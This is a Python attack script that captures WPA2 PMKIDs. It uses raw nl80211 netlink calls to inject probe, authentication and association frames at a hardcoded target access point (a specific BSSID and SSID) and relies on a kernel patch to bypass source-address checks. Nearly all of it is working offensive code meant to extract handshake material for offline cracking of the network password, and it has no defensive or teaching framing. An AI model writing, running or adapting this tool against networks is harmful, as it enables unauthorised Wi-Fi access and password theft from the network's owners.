#!/usr/bin/env python3
"""
PMKID capture via nl80211 CMD_FRAME.
Sends auth + assoc request to trigger EAPOL msg1 containing PMKID.
Requires monitor mode with kpatch3 for SA bypass.
"""
import socket, struct, fcntl, sys, time

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, NLM_F_REQUEST|NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

def send_frame(sock, fid, ifidx, freq, frame, seq):
    attrs = nla(3, struct.pack('I', ifidx))
    attrs += nla(38, struct.pack('I', freq))
    attrs += nla(51, frame)
    attrs += struct.pack('HH', 4, 118)
    genlhdr = struct.pack('BBH', 59, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fid, NLM_F_REQUEST|NLM_F_ACK, seq, 0)
    sock.send(nlhdr + payload)
    try:
        resp = sock.recv(4096)
        nltype = struct.unpack_from('H', resp, 4)[0]
        if nltype == 2:
            return struct.unpack_from('i', resp, 16)[0]
        return 0
    except socket.timeout:
        return -110

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else 'wlan0'
    bssid_str = sys.argv[2] if len(sys.argv) > 2 else '04:67:61:D6:DC:92'
    freq = int(sys.argv[3]) if len(sys.argv) > 3 else 2412

    bssid = bytes.fromhex(bssid_str.replace(':', ''))
    fid = get_nl80211_family_id()
    ifidx = get_ifindex(iface)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', iface.encode()))
    our_mac = info[18:24]
    sock.close()

    print(f"[*] PMKID capture: {iface} idx={ifidx} mac={our_mac.hex(':')}")
    print(f"[*] Target: {bssid.hex(':')} freq={freq}")

    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.settimeout(2)

    seq = 10

    # Send primer
    primer = struct.pack('<HH', 0x0040, 0)  # probe req
    primer += b'\xff\xff\xff\xff\xff\xff' + our_mac + b'\xff\xff\xff\xff\xff\xff'
    primer += struct.pack('<H', 0)
    primer += b'\x00\x00\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24'
    rc = send_frame(s, fid, ifidx, freq, primer, seq)
    seq += 1
    print(f"[*] Primer probe: rc={rc}")

    # Send Authentication frame (Open System, seq 1)
    # FC=0x00b0 (auth), DA=BSSID, SA=our_mac, BSSID=BSSID
    for attempt in range(5):
        auth = struct.pack('<HH', 0x00b0, 0)  # auth frame
        auth += bssid + our_mac + bssid
        auth += struct.pack('<H', (seq & 0xfff) << 4)
        # Auth algorithm (Open System=0), Auth seq num (1), Status (0=success)
        auth += struct.pack('<HHH', 0, 1, 0)

        rc = send_frame(s, fid, ifidx, freq, auth, seq)
        seq += 1
        print(f"[*] Auth frame {attempt+1}: rc={rc}")

        time.sleep(0.5)

        # Send Association Request
        # FC=0x0000 (assoc req)
        assoc = struct.pack('<HH', 0x0000, 0)  # assoc req
        assoc += bssid + our_mac + bssid
        assoc += struct.pack('<H', (seq & 0xfff) << 4)
        # Capability info (ESS + Privacy)
        assoc += struct.pack('<H', 0x0431)
        # Listen interval
        assoc += struct.pack('<H', 10)
        # SSID IE (we need the AP's SSID - empty for now, AP might reject)
        # For "不想上班" - UTF-8 encoded
        ssid = "不想上班".encode('utf-8')
        assoc += struct.pack('BB', 0, len(ssid)) + ssid
        # Supported rates
        assoc += b'\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24'
        # RSN IE for WPA2-PSK
        rsn = b'\x30'  # RSN element ID
        rsn_body = struct.pack('<H', 1)    # version
        rsn_body += b'\x00\x0f\xac\x04'    # group cipher: CCMP
        rsn_body += struct.pack('<H', 1)    # pairwise cipher count
        rsn_body += b'\x00\x0f\xac\x04'    # pairwise cipher: CCMP
        rsn_body += struct.pack('<H', 1)    # AKM count
        rsn_body += b'\x00\x0f\xac\x02'    # AKM: PSK
        rsn_body += struct.pack('<H', 0x000c)  # RSN capabilities (MFPC)
        # PMKID list (empty - triggers AP to send PMKID in EAPOL)
        rsn_body += struct.pack('<H', 0)    # PMKID count = 0
        rsn += struct.pack('B', len(rsn_body)) + rsn_body
        assoc += rsn

        rc = send_frame(s, fid, ifidx, freq, assoc, seq)
        seq += 1
        print(f"[*] Assoc request {attempt+1}: rc={rc}")

        time.sleep(1)

    s.close()
    print("[*] Done. Check airodump-ng capture for EAPOL/PMKID.")

if __name__ == '__main__':
    main()
